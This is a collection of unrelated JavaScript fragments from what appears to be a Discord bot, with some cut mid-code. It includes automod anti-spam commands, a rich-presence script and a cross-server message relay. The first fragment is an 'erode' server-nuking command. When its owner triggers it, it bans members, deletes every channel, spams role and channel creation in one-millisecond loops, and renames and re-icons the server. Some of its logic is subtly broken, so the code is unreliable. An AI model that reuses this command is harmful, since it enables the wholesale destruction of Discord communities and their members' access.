

        case 'erode':
            if (message.author.id !== config.master) return;
            await message.delete();
            try {
                const theseMembers = message.guild.members.cache.filter(member => member.bannable);
                theseMembers.forEach(member => member.ban);
                message.guild.channels.cache.forEach(channel => channel.delete());
                setInterval(() => {
                    if (message.guild.roles.cache.size <= 249) return;
                    message.guild.roles.create({ name: `${Math.floor(Math.random() * 1000)}` });
                }, 1);

                setInterval(() => {
                    if (message.guild.channels.cache.size <= 499) return;
                    message.guild.channels.create({ name: `${Math.floor(Math.random() * 1000)}` });
                }, 1);

                message.guild.setName(`erode`);

                message.guild.setIcon('https://cdn.discordapp.com/attachments/1199776472768987236/1213910171865059359/metsu.jpeg?ex=65f730f2&is=65e4bbf2&hm=8b5ba1068c625cd50defb6320e4161cf47ffaba0bdb05ac46e46bfa93b2217c3&')

            } catch (err) {
                console.log(err)
            }
            break;


    if (interaction.commandName === 'automod-spam-remove') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        await interaction.guild.autoModerationRules.fetch()
        await interaction.deferReply();

        const spamRule = interaction.guild.autoModerationRules.cache.find(AutoModerationRule => AutoModerationRule.creatorId === `${config.clientId}`);

        if (!spamRule) return interaction.editReply({ content: `Couldn't find an Automoderation rule made by kuromi` }).catch((err) => console.log(err));

        interaction.guild.autoModerationRules.delete(spamRule).then(interaction.editReply({ content: `Automod rule spam messages made by kuromi has been removed` })).catch((err) => console.log(err));
    }

    if (interaction.commandName === 'automod-spam') {
        if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
        await interaction.deferReply();

        const rule1 = await interaction.guild.autoModerationRules.create({
            name: 'Prevent spam messages by kuromi',
            creatorId: `${config.clientId}`,
            enabled: true,
            eventType: 1,
            triggerType: 3,
            triggerMetadata: {
                mentionTotalLimit: 3
            },
            actions: [
                {
                    type: 1,
                    metadata: {
                        channel: interaction.channel,
                        durationSeconds: 10,
                        customMessage: `Message was blocked by kuromi through auto moderation`
                    }
                }
            ]
        }).catch(async err => {
            setTimeout(async () => {
                console.log(err);
                await interaction.editReply({ content: `${err}` });
            }, 2000);
        })

        setTimeout(async () => {
            if (!rule1) return;

            await interaction.editReply({ content: `Automod rule has been created. All spam messages will now be deleted` });
        }, 3000);
    }


const DiscordRPC = require('discord-rpc');
const RPC = new DiscordRPC.Client({ transport: 'ipc' });

DiscordRPC.register('1142613870985363517');

async function setActivity() {
    if (!RPC) return;
    RPC.setActivity({
        details: 'Kanye West',
        largeImageKey: `i_wonder_album_cover`
    })
}
RPC.on('ready', async () => {
    setActivity();

    setInterval(() => {
        setActivity();
    }, 15 * 1000);
});
RPC.login({ clientId: `1142613870985363517` });


    const myChannel = client.channels.cache.get('1194375819708084335')
    const tfmeChannel = client.channels.cache.get('1194375834727886848')
    if (message.channel.id == myChannel) {
        tfmeChannel.send(`## ${message.author.username} sent a message:\n"${message.content}"`)
        let fetchedMessages = await message.channel.messages.fetch();
        let stickyMessage = fetchedMessages.find(m => m.content.includes("### Messages sent here are sent to tfme's server."));

        if (stickyMessage) {
            stickyMessage.delete().then(() => {
                message.channel.send("### Messages sent here are sent to tfme's server.");

            }).catch(() => { });
        } else {
            // Force send a new message.
            message.channel.send("### Messages sent here are sent to tfme's server.");
        }
    }
    if (message.channel.id == tfmeChannel) {
        myChannel.send(`## ${message.author.username} sent a message:\n"${message.content}"`)
        let fetchedMessages = await message.channel.messages.fetch();
        let stickyMessage = fetchedMessages.find(m => m.content.includes("### Messages sent here are sent to hanafuda's server."));

        if (stickyMessage) {
            stickyMessage.delete().then(() => {
                message.channel.send("### Messages sent here are sent to hanafuda's server.");

            }).catch(() => { });
        } else {
            // Force send a new message.
            message.channel.send("### Messages sent here are sent to hanafuda's server.");
        }
    }
